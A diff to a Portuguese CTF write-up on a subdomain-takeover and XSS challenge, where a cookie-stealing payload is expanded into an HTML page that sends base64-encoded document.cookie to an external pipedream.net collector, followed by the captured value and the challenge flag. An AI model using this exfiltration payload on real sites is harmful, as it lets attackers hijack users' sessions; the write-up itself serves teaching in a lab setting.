@@ -61,13 +61,27 @@ Com isso, testando as combinações de subdomínios descobririamos alguns vulner
 Encontrado um subdomínio vulnerável, podemos cadastrar uma conta no Myprofile, cadastrar o domínio `guerra.blog.ganeshicmc.com` e criar um payload que extraia os cookies e envie para algum RequestBin ou outro local de nosso controle como o seguinte:
 
 ```html
-<script>alert('xss');</script>
-<script>fetch('https://ent6k7fximtwm.x.pipedream.net/c=' + document.cookie);</script>
+ <!DOCTYPE html>
+<html>
+  <head>
+  <title>Page Title</title>
+  </head>
+<body>
+  <h1>Cookie Extractor</h1>
+  <p>Payload para roubar cookie com dois requests de controle para auxiliar :)</p>
+  
+  <img src="http://ent6k7fximtwm.x.pipedream.net/control.png"/>
+  <script>fetch('http://ent6k7fximtwm.x.pipedream.net/c=' + btoa(document.cookie));</script>
+  <img src="http://ent6k7fximtwm.x.pipedream.net/control2.png"/>
+  
+</body>
+</html> 
 ```
 
 Com isto basta enviarmos o link (http://guerra.blog.ganeshicmc.com:8001/) para o administrador e recuperar a flag:
 
 ```
+ZmxhZz1HYW5lc2h7UzBfdGg0dHNfdGgzX3IzQXM5bl9JX24zM2RfdG9fMWU0ck5fVzNiXzRuZF9OZVR3MHJrU19IbW1tfQ==
 Ganesh{S0_th4ts_th3_r3As9n_I_n33d_to_1e4rN_W3b_4nd_NeTw0rkS_Hmmm}
 ```
 
